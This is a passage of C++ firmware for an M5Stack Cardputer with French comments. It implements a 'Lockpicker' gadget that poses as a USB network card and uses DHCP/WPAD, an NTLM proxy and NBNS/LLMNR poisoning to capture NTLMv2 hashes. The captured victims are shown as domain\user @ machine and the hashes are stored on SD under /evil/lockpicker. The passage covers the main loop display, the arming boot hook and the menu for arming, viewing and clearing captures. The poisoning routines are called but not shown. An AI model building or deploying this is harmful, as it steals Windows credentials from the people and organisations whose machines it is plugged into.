  lpCapTotal = 0; lpCapAt = 0; lpCapLogHead = lpCapLogCount = 0;
  bool disarm = false; uint32_t lastDraw = 0;

  // UI M5GFX flicker-free via sprite (fallback direct si l'alloc echoue en gadget)
  M5Canvas cv(&M5Cardputer.Display);
  bool spr = cv.createSprite(240, 135);
  cv.setTextSize(1);

  for (;;) {
    lpDhcp(dhcp, st);
    lpHttp80(http80, st);
    lpProxy3128(proxy, st);
    lpResponderPoll(IPAddress(192,168,7,1));   // NBNS/LLMNR poison + capture SMB1/SMB2

    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) { disarm = true; break; }

    uint32_t now = millis();
    bool warn = (lpCapAt && now - lpCapAt < 4500);         // alerte WARN 4.5 s apres une capture
    if (now - lastDraw > (warn ? 110 : 350)) {             // refresh plus vif pendant le flash
      lastDraw = now;
      bool blink = ((now / 280) & 1);
      if (spr) {
        cv.fillSprite(0x0000);
        cv.fillRect(0, 0, 240, 15, 0x5000);                            // topbar
        cv.setTextColor(0xFFFF); cv.setCursor(6, 4);   cv.print("LOCKPICKER");
        cv.setTextColor(0xC618); cv.setCursor(154, 4); cv.print("RNDIS .7.1");
        cv.drawFastHLine(0, 15, 240, 0x07E0);
        cv.setTextColor(0xAD55); cv.setCursor(6, 19); cv.printf("DHCP leases: %lu", (unsigned long)st.dhcp);
        auto chip = [&](int x, const char* lab, uint32_t v) {          // chips compteurs
          cv.drawRoundRect(x, 31, 55, 15, 3, 0x4208);
          cv.setTextColor(0x07FF); cv.setCursor(x + 4, 35); cv.printf("%s %lu", lab, (unsigned long)v);
        };
        chip(6, "HTTP", st.http); chip(64, "407", st.ntlm407);
        chip(122, "SMB", (uint32_t)hashCount); chip(180, "NTLM", lpCapTotal);
        cv.setTextColor(0x8C51); cv.setCursor(6, 52); cv.print("Victims (domain\\user @ machine):");
        int shown = 0;                                                 // liste des captures
        for (int i = 0; i < lpCapLogCount && shown < 4; i++) {
          int idx = (lpCapLogHead - 1 - i + LP_CAP_RING * 2) % LP_CAP_RING;
          cv.setTextColor(i == 0 ? 0x07E0 : 0xAD55);
          cv.setCursor(8, 64 + shown * 11); cv.printf("%.37s", lpCapLog[idx]); shown++;
        }
        if (!lpCapLogCount) { cv.setTextColor(0x632C); cv.setCursor(8, 66); cv.print("(waiting for an NTLM auth...)"); }
        if (warn) {                                                    // banniere WARN clignotante
          uint16_t bg = blink ? 0xF800 : 0xFD20;                       // rouge <-> orange
          cv.fillRoundRect(5, 50, 230, 32, 4, bg);
          cv.drawRoundRect(5, 50, 230, 32, 4, 0xFFFF);
          cv.setTextColor(0x0000);
          cv.setCursor(14, 55); cv.print("/!\\  NTLMv2 CAPTURE  /!\\");
          cv.setCursor(14, 68); cv.printf("%s\\%s @ %s",
                      lpCapDom[0] ? lpCapDom : "?", lpCapUser[0] ? lpCapUser : "?", lpCapMach);
        }
        cv.setTextColor(0x632C); cv.setCursor(6, 124); cv.print("BKSP = disarm + reboot");
        cv.pushSprite(0, 0);
      } else {                                                         // fallback sans sprite
        auto& d = M5Cardputer.Display; d.fillScreen(BLACK);
        d.setTextColor(warn ? (blink ? TFT_RED : TFT_ORANGE) : TFT_RED, BLACK); d.setCursor(4,4); d.print("LOCKPICKER gadget");
        d.setTextColor(TFT_WHITE, BLACK); d.setCursor(4,22); d.printf("DHCP:%lu HTTP:%lu 407:%lu", (unsigned long)st.dhcp,(unsigned long)st.http,(unsigned long)st.ntlm407);
        d.setTextColor(TFT_GREEN, BLACK); d.setCursor(4,40); d.printf("NTLMv2 captures: %lu", (unsigned long)lpCapTotal);
        if (lpCapLogCount) { int idx=(lpCapLogHead-1+LP_CAP_RING)%LP_CAP_RING; d.setTextColor(TFT_CYAN,BLACK); d.setCursor(4,58); d.printf("%.36s", lpCapLog[idx]); }
        d.setTextColor(TFT_DARKGREY, BLACK); d.setCursor(4, d.height()-12); d.print("BKSP=disarm+reboot");
      }
    }
    delay(2);
  }
  if (spr) cv.deleteSprite();

  if (disarm) lpArmedWrite(false);
  M5Cardputer.Display.fillScreen(BLACK);
  M5Cardputer.Display.setCursor(4,40); M5Cardputer.Display.print("Rebooting...");
  M5Cardputer.Display.display(); delay(600);
  ESP.restart();
}

// ============================ hooks publics ===================================
// A appeler TOUT EN HAUT de setup() (avant USB.begin() du firmware). Si arme :
// prend la main et ne revient jamais. Sinon : no-op (boot normal, zero RAM).
inline void lockpickerBootHook() {
  if (!lpArmedRead()) return;
  lpArmedWrite(false);   // SECURITE ANTI-BOOTLOOP : desarmer AVANT tout code risque.
                         // Si lpGadgetRun() crashe (USB/RNDIS/lwIP), le reboot suivant lit
                         // le flag a false -> boot NORMAL (plus de bootloop). Le gadget tourne
                         // donc une seule fois par ARM, ce qui est le comportement voulu.
  // M5 minimal pour l'UI + SD pour les captures
  auto cfg = M5.config(); M5Cardputer.begin(cfg);
  SD.begin();
  lpGadgetRun();   // ne revient pas
}

// Menu (entree dediee). Arme le mode gadget + reboot, ou affiche les captures.
inline void lockpickerMenu() {
  int idx = 0, last = -1;
  const char* items[] = { "ARM gadget + reboot", "View captured hashes", "Clear captures", "Back" };
  const int N = 4;
  for (;;) {
    if (idx != last) {
      auto& d = M5Cardputer.Display; d.fillScreen(BLACK); d.setTextSize(1);
      d.setTextColor(TFT_RED, BLACK); d.setCursor(4,4); d.println("Lockpicker NTLM-over-USB");
      d.setTextColor(TFT_DARKGREY, BLACK); d.setCursor(4,18);
      d.println("USB RNDIS + DHCP WPAD + proxy NTLM");
      for (int i=0;i<N;i++){ int y=40+i*16;
        if(i==idx){ d.fillRect(0,y-2,d.width(),14,menuSelectedBackgroundColor); d.setTextColor(menuTextFocusedColor,menuSelectedBackgroundColor); }
        else d.setTextColor(menuTextUnFocusedColor,menuBackgroundColor);
        d.setCursor(6,y); d.print(items[i]); }
      d.setTextColor(TFT_DARKGREY,BLACK); d.setCursor(4,d.height()-12);
      d.print(";/. ENT  `=back");
      d.display(); last = idx;
    }
    cardUpdate();
    if (kp('`') || kp(KEY_BACKSPACE)) { backDebounce(); return; }
    if (kp(';')) { idx=(idx+N-1)%N; delay(140); }
    if (kp('.')) { idx=(idx+1)%N; delay(140); }
    if (kp(KEY_ENTER)) {
      enterDebounce();   // attend le relache -> l'ecran de confirm exige un NOUVEL appui (pas d'auto-arm)
      if (idx==0) {
        auto& d=M5Cardputer.Display; d.fillScreen(BLACK); d.setTextColor(TFT_YELLOW,BLACK);
        d.setCursor(4,20); d.println("ARM RNDIS gadget?");
        d.setTextColor(TFT_WHITE,BLACK); d.setCursor(4,44);
        d.println("On reboot: USB network card +");
        d.setCursor(4,58); d.println("NTLM capture. Reflash = G0.");
        d.setCursor(4,80); d.println("ENTER=arm  `=cancel"); d.display();
        for(;;){ cardUpdate();
          if (kp(KEY_ENTER)) { lpArmedWrite(true); d.fillScreen(BLACK); d.setCursor(4,40); d.print("Rebooting gadget..."); d.display(); delay(600); ESP.restart(); }
          if (kp('`')||kp(KEY_BACKSPACE)) { keyRelease(); break; } delay(8); }
        last=-1;
      } else if (idx==1) {
        auto& d=M5Cardputer.Display; d.fillScreen(BLACK); d.setTextSize(1);
        d.setTextColor(TFT_GREEN,BLACK); d.setCursor(4,4); d.println("NTLMv2 captures (SD):");
        d.setTextColor(TFT_WHITE,BLACK); d.setTextWrap(false,false);
        File f=SD.open("/evil/lockpicker/ntlm.txt",FILE_READ); int y=20,cnt=0;
        if(f){ while(f.available() && y<d.height()-14){ String l=f.readStringUntil('\n'); l.trim(); if(l.length()){ d.setCursor(2,y); d.print(l.substring(0,46)); y+=11; cnt++; } } f.close(); }
        if(!cnt){ d.setCursor(4,20); d.print("(no capture)"); }
        d.display(); for(;;){ cardUpdate(); if(kp('`')||kp(KEY_ENTER)||kp(KEY_BACKSPACE)){ keyRelease(); break; } delay(8);} last=-1;
      } else if (idx==2) {
        SD.remove("/evil/lockpicker/ntlm.txt");
        auto& d=M5Cardputer.Display; d.fillScreen(BLACK); d.setCursor(4,40); d.print("Captures cleared."); d.display(); delay(700); last=-1;
      } else return;
    }
    delay(8);
  }
}
